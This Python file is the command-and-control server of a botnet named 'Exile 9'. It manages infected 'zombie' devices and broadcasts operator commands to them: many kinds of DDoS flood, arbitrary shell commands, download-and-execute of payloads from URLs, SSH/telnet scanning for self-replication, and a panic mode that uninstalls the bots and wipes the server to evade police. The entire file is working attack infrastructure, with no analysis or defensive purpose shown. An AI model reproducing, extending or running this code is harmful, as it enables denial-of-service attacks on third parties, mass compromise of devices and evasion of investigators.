import sys, os, time, socket, math
import random, threading

_bots = []
_exit = threading.Event()

def _bdcast(_msg, _prcnt):
    # broadcast command to all clients
    global _bots
    
    i = 0
    
    for zombie in _bots:
        try:
            zombie.send(_msg.encode())
            i +=1
        except:
            # remove offline/dead device
            _update()
            _bots.remove(zombie)
            
        if i == int(_prcnt):
            # reached maximum network specifier
            break

    if ('reconnect' in _msg.lower() or 'disconnect' in _msg.lower() or 'uninstall' in _msg.lower() or 'update' in _msg.lower()):
    	_bots.clear()
    	_update()

def _kalive():
    # keep-alive heartbeat
    global _exit, _bots
    while not _exit.is_set():
        if len(_bots) != 0:
            for zombie in _bots:
                try:
                    zombie.settimeout(5)
                    zombie.send('ping'.encode())
                except:
                    # remove offline/dead device
                    _bots.remove(zombie)

        _update()
        time.sleep(30)

def _listen():
    global _bots, _exit

    # execute heartbeat routine
    try:
        _h = threading.Thread(target=_kalive)
        _h.daemon = True
        _h.start()
    except:
        sys.exit('Critical error! Exiting...')

    # setup listener
    try:
        # bind to socket
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((sys.argv[1], int(sys.argv[2])))

        server.listen(10000) # 10K device backlog limit
    except socket.error:
        sys.exit('Failed to bind to port! Exiting...')

    # listen until program exit
    while not _exit.is_set():
        try:
            client, address = server.accept()
            _bots.append(client)
            # send infected device a welcome message
            client.send("Welcome to the NET!".encode())

            _update()
        except Exception as e:
            # device disconnect/rejected
            if 'client' in locals():
                _bots.remove(client)
                _update()

    _h.join()
    sys.exit()

def _update():
    global _bots
    try:
        # update terminal title
        _t = ' Exile 9  ||  Listening ' + sys.argv[1] + '@' + sys.argv[2] + '  ||  Bots: ' + str(len(_bots))
        sys.stdout.write(f"\x1b]2;{_t}\x07")
        sys.stdout.flush()
    except:
        pass
    
def main():
    global _exit, _bots
    os.system('clear')
    if len(sys.argv) != 3:
        sys.exit('Usage: <c2 ip-address> <c2 port>\r\n')
        
    # start listener
    try:
        _l = threading.Thread(target=_listen)
        _l.daemon = True
        _l.start()
    except:
        sys.exit('\r\nFailed to start listener! Exiting...\r\n')

    # main banner
    _update()
    _user = os.getlogin()
    _panic = False
    banner = '''\033[22m\033[31m
                                             .          ..
                                            @88>  x .d88"
                                uL   ..     %8P    5888R
                       .u     .@88b  @88R    .     '888R        .u
                    ud8888.  '"Y888k/"*P   .@88u    888R     ud8888.
                  :888'8888.    Y888L     ''888E`   888R   :888'8888.
                  d888 '88%"     8888       888E    888R   d888 '88%"
                  8888.+"        `888N      888E    888R   8888.+"
                  8888L       .u./"888&     888E    888R   8888L
                  '8888c. .+ d888" Y888*"   888&   .888B . '8888c. .+
                   "88888%   ` "Y   Y"      R888"  ^*888%   "88888%
                     "YP'                    ""      "%       "YP'\033[37m
      
                  \033[1mPROGRAMMED BY WAIVED | SELF-REP | WARNING: MAY HURT!\r\n\033[22m
'''
    print(banner)
    while True: 
        try:
            # accept user commands
            option = input(' \033[22m\033[37m' + _user + '\033[31m@\033[1m\033[32mexileC2:\033[22m\033[37m ')
            if option.lower() == 'help':
                print('''
 C2 commands:
     clear                         = Refreshes C2 environment
     goodbye                       = Power-off C2 (safer CTRL+C alternative)
     v&                            = Vanned! Uninstall clients + delete server
      
 Bot commands / general:
     uninstall                     = Terminate connections + remove backdoor 
     reconnect                     = Reset all C2 connections
     disconnect                    = Terminate all C2 connections
     update <url to client>        = Purge client and update w/ new script
     load <url to file> <path>     = Upload/execute ELF, C, SH, or PY script on bots
     kill <scans/floods>           = Abort any/all DDoS attacks and/or scans
     sh <command statement>        = Run SH (Bourne Again Shell) command
     
 Bot commands / flood:
     !udp <target> <port> <byte range:x-y> <time> <threads> <% of network>
     !tcp <target> <port> <byte range:x-y> <time> <threads> <% of network>
     !rhex <target> <port> <byte range:x-y> <time> <threads> <% of network>
     !httpbypass <target> <port> <time> <threads> <ssl? y/n> <% of network>
     !hold <target> <port> <sockets> <sleep> <time> <threads> <% of network>
     !recoil <target> <path+file> <delay sec> <time> <threads> <% of network>
     !stdhex <target> <port> <time> <threads> <% of network>
     !quake3 <target> <port> <time> <threads> <% of network>
     !http <target> <port> <time> <threads> <% of network>
     !fivem <target> <port> <time> <threads> <% of network>
     !httphex <target> <port> <time> <threads> <% of network>
     !tls <target> <time> <threads> <% of network>
     !vse <target> <port> <time> <threads> <% of network>
     !ts3 <target> <port> <time> <threads> <% of network>
     
 Bot commands / scans & self-rep:
     scan <ssh/telnet> <# of ips|0=infinite> <delay> <timeout>
     botkiller
''')
            elif option.lower() == 'clear':
                os.system('clear')
                print(banner)
            elif option.lower() == 'goodbye':
                _exit.set()
                break
            elif option.lower() == 'v&':
                _panic = True
                break
            elif option.startswith('!'):
                # calculate network percentage for ddos
                _percent = 100
                try:
                    _prcnt = option.split()[-1]
                    _percent = math.floor(len(_bots) * (_prcnt / 100))
                    
                    # avoid "zero" bots attacking lmao
                    if (_percent == 0 and len(_bots) != 0):
                        _percent = 1
                except:
                    _percent = 100
                
                _bdcast(option, _percent)
            else:
                _bdcast(option, 0)
        except KeyboardInterrupt:
            print('\r\n')
        except Exception as e:
            pass
 
    if _panic == True:
        # panic function. uninstall clients / delete server
        os.system('clear')
        print('#Swatted ~ dont drop the soap lmao...')
        _exit.set()
        # uninstall all clients
        _bdcast('uninstall', len(_bots))
    
        # self-destruct server
        with open('wipe.sh', 'w') as f:
            f.write('sleep 5 && rm -f "' + __file__ + '" && rm -f $0')
            f.close()
        os.system('chmod +x wipe.sh')
        os.system('sh wipe.sh')
        sys.exit()

    sys.exit('\r\n Session terminated.')

if __name__ == "__main__":
    main()
